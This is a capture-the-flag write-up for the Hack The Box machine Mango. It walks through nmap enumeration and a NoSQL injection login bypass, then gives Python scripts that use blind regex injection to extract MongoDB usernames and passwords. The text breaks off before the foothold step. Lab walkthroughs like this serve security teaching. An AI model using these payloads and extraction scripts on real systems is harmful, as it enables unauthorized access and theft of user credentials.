# HTB CTF - Mango

## Box information

Mango is a medium difficulty Linux machine hosting a website that is found vulnerable to NoSQL injection. 
The NoSQL database is discovered to be MongoDB, from which we exfiltrate user credentials. We can use one set of credentials to gain a foothold using SSH, and the other to move laterally within the box.
A SUID binary is then exploited to escalate our privileges to root. 

## Enumeration
### Port Scan

As always, we will start by scanning for all open TCP ports.

```console
0ph3@parrot~$ nmap -p- --min-rate=5000 10.10.10.162
Nmap scan report for 10.10.11.222
Host is up (0.11s latency).
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  ssl/https
```
Once we have a list of open ports, we can run more enumeration scripts against open services.
Doing the version and default script scan separately will save time and reduce the overall network traffic.

```console
0ph3@parrot~$ nmap -p 22,80,443 -sC -sV 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.056s latency).

```

Only three ports appear to be open. It's worth noting the nmap enumeration script found the staging-order subdomain name for mango.htb in the ssl cert's CommonName.
We will add both mango.htb and staging-order.mango.htb to our attacking machine's ```/etc/hosts``` file.
We could have also found this by inspecting the certificate from within the browser. It's always a good idea to inspect ssl certs as they may contain subdomains or even potential usernames.

<CERT IMAGE>

It's also worth noting both web services are running on the same version of Apache 2.4.29. If they were different, it could mean we are dealing with containerized instances.

### SSH (22/TCP)
The ssh service itself isn't usually exploitable and OpenSSH 7.6p1 doesn't have any known exploits we can take advantage of at the time of writing this.
However, it may have misconfigurations that allow for other attacks like brute forcing. It can also be of used to gain access to the machine if we manage
to find valid username and credentials from the other running services.
For now we will move on to the http/https web services which usually provide a larger attack surface depending on the web application hosted. 

### https (443/TCP)
Navigating to either ```https://mango.htb``` or ```https://staging-order.mango.htb``` directs us to what appears to be a search engine made to look like the Google Search page.
The search functionality does not seem to return any data regardless of what is sent. No command injection,SQLi or NoSQLi payloads seem to affect the results returned or behavior of the server.

<Mango Search Image>

There is a link to the /analytics.php page in the top right corner.
However, it only seems to provide static data which is displayed in a series of charts and graphs using the Flexmonster javascript component.

Directory busting the website only returns ```https://mango.htb/server-status``` page but navigating to it results in a 403 Forbidden error.

### http (80/TCP)
Navigating directly to ```https://10.10.10.162``` returns a 403 Forbidden status code.
However, using the subdomain found in the certificate, ```http://staging-order.mango.htb```,  directs us to the login page.

<Mango login image>

Trying some default credentials like ```admin:admin``` or ```admin:password``` leads nowhere unfortunately.
The next step we can take is to try some injection payloads to bypass authentication.
We can narrow down what injection payloads to prioritize by thinking about the application's stack and how authentication is being performed.
From our scans, we know this is a Linux server, running Apache and we know from the page extensions it is using php. 
If we assume a database is being used for authentication, the most likely application stack being used should be Linux, Apache, MySQL, PHP (LAMP) or Linux, Apache, MongoDB, PHP (LAMP with Mongo).

We don't have success with any SQLi authentication bypass payloads. 
The application may be using a NoSQL Mongo database instead. Before we try any NoSQL injection payloads, let's review how NoSQL injections work.

### MongoDB and NoSQL Injection
Unlike a relational database like MySQL, which uses standard tables with rows and columns to store data, a NoSQL MongoDB database stores data in collections using BSON (Binary JSON) key-pair values.
A MongoDB database will have databases that contain collections which hold key-pair values. So for authentication, there could be a database that contains a ```users``` collection which holds data for each user.

```javascript
{
  "_id": "ObjectId(5d8e25334f3bf1432628927b)",
  "username": "user",
  "password": "Sup3rS3cretP@ssw0rd!"
}
```

The query used on the backend to verify credentials using a```<username>```  and ```<password>``` value might look like:
```javascript
db.users.find({
    username: "<username>",
    password: "<password>"
});
```

If the php application does not sanitize user input when creating a new database query, a user could inject an object that causes the query to always returns true, effictivly bypassing authentication
```php
$client = new MongoDB\Client("mongodb://localhost:27017");
$collection = $client->mango->users;
$user = $collection->find(array("username"=>$_POST['username'],"password"=>$_POST['password']));
```

With unsanitized input from the above query, we can use the ```$ne``` operator to inject a comparison, ```{$ne: "invalid"}```, causing the search result for the username and password return as ```true``` and authenticating use as the first user in the database collection.
```javascript
db.users.find({
    username: {$ne: "invalid"},
    password: {$ne: "invalid"}
});
```
### Testing the Login for NoSQLi
Armed with a basic understanding of how NoSQLi authentication bypass attacks work, we can intercept the authentication request and try injecting a payload to get us in.

<Image of request>

Depending on the Content-Type of the form data being sent to the server, we might have to change how we construct our payload. In our case, with a php backend using a ```Content-Type``` of ```application/x-www-form-urlencoded```, we cannot just pass json data in our request as ```{$ne: "invalid"}```. We will have to edit the syntax of the url-encoded parameters to pass in our object. 
We can achieve this by changing the username and password parameters as ```username[$ne]=invalid```

<Picture of Request injection and result>

Our injection payload works and we are redirected to ```/home.php```

<Picture of planting still>

It seems like there is no functionality available to us as the web application is still under construction.
Directory busting with our new session cookie doesn't result in any useful pages opening up. 
This might seem like a dead end but there is still more we can do with the NoSQL injection vulnerability.

## User foothold 
### Blind Boolean NoSQLi Exfiltration
It is possible we can use the NoSQLi vulnerability we found to exfiltrate all username and passwords in the database's user collection.
Our previous payload ```{$ne: "invalid"}``` made the authentication query always return true for the username and password allowing us to login.
We can use this behavior to build a payload that only returns true and logs us in if the username matches a regular expression patter.
Effectively, we can extract the username one character at a time depending if the pattern tested results in a sucessful authentication

This can be acheived by injecting the ```$regex``` as the operator in our comparison object instead of ```$ne```
For example the following injected payload ```{$regex: "^a.*"}``` in the username will log us in if the username starts with the letter 'a':
```javascript
db.users.find({
    username: {$regex: "^a.*"},
    password: {$ne: "invalid"}
});
```
We can repeat this, appending valid characters to the regex pattern, until we finally extract a valid username.

Once we have a valid username, we can extract the respective password using the same method.
```javascript
db.users.find({
    username: "admin",
    password: {$regex: "^a.*"}
});
```
### Extracting Admin Username
If we remember, we found admin@mango.htb in the email address field of the ssl cert so let's test out if there is a user with the letter 'a'.

<Starts with a user>

From the ```302 Found``` redirect to ```/home.php``` we can conclude there is a username that starts with the letter 'a'.
We can iterate through each letter for the subsequent characters of the username ```username[$regex]=^aa.*``` until we finally find the admin username. We could have also just inserted
the admin password to confirm our suspicions ```username=admin&password[$ne]=invalid&login=login```. 
> Note that for user enumeration, you could fuzz for valid usernames using a wordlist and the following request payload ```username=FUZZ&password[$ne]=invalid&login=login``` with ffuf or burp intruder.
{: .prompt-info }

Now that we have 'admin' as a valid username, we can use the same method to extract the password. Doing this manually is possible but it would take a very long time so instead, we will build a python script 
to automate extracting all users and passwords from the MongoDB collection.

### Building a script to automate exfiltration

We can start by building an ```oracle``` function. The oracle will return true if the server's response data to our request contains a specific string, ```tstring```, that indicates authentication was sucessful. In our case ```Under Plantation``` is a string that appears after authenting that we can check for. The oracle will use the same request data we used previously used to inject our supplied payload into the ```[$regex]=``` comparision to validate if the parameter we are extracting from begins with the payload. 

Request data based on the target field we are exfiltrating 
<ul>
  <li>Extract username:```username[$regex]=^PAYLOAD.*&password[$ne]=x&login=login```</li>
  <li>Extract Password:```username='VALIDUSER'&password[$regex]=^PAYLOAD.*&login=login```</li>
</ul>

```python
def oracle(payload, tstring, target_param='username', validuser=''):

    #Our data and injection point for the request will change based on whether we are extracting the username or password.
    if target_param == 'username':

        data = 'username[$regex]=^'+quote_plus(payload)+'.*&password[$ne]=x&login=login'

    elif target_param == 'password':

        data = 'username='+ quote_plus(validuser) +'&password[$regex]=^'+quote_plus(payload)+'.*&login=login'

    #Make a request to the server using the data defined above
    response = requests.post(
        url='http://10.10.10.162/', 
        headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
        data=data
    )
    #return True if authentication was successful
    if tstring in response.text:
        return True
```
We can now build a function to iterate through all ascii alphanumerical characters to  until the username we extract results in sucessfull authentication.
An empty ```username``` is initially passed into the function, each time a valid character is found, we recursively call the function adding the valid character to the current username value until we extract the full username that authenticates
using a standard authentication bypass payload ```username=<extracted-username>&password[$ne]=invalid``` 

```python

def findUsername(username):  

    for i in string.ascii_letters + string.digits:
        print("Fuzzing Username: %s%s" % (username, i), end='\r')
        if oracle(username + i, "Under Plantation"):
            #Test if username string is the full username
            r = requests.post(
                url='http://10.10.10.162/', 
                headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
                data='username='+username + i +'&password[$ne]=x&login=login'
            )
            if "Under Plantation" in r.text:
                print("\x1b[2K", end="\r")
                print("Username Found!: %s" % (username + i))
                findPassword(username + i)
                break
            findUsername(username + i)
```

Once a valid username is found, it will be passed to the ```findPassword()``` which will attempt to extract the password for the specified user.
The valid username will be passed to the oracle function and set the ```target_parameter``` will be set to ```password``` to set the payload to target the password field.

```python
def findPassword(username, password=''):     
    while True:
        for i in string.ascii_letters + string.digits + string.punctuation:
            if i in {"?","*", "+", ".","\\", "|"}:
                continue
            print("Fuzzing Password: %s%s" % (password, i), end='\r')
            if oracle(password + i, "Under Plantation", target_param='password', validuser=username):
                password += i
                r = requests.post(
                    url='http://10.10.10.162/', 
                    headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
                    data='username='+username+'&password='+ password +'&login=login'
                )
                if "Under Plantation" in r.text:
                    print("\x1b[2K", end="\r")
                    print("Password Found!: %s\n" % (password))
                    return password
                break
```


```python
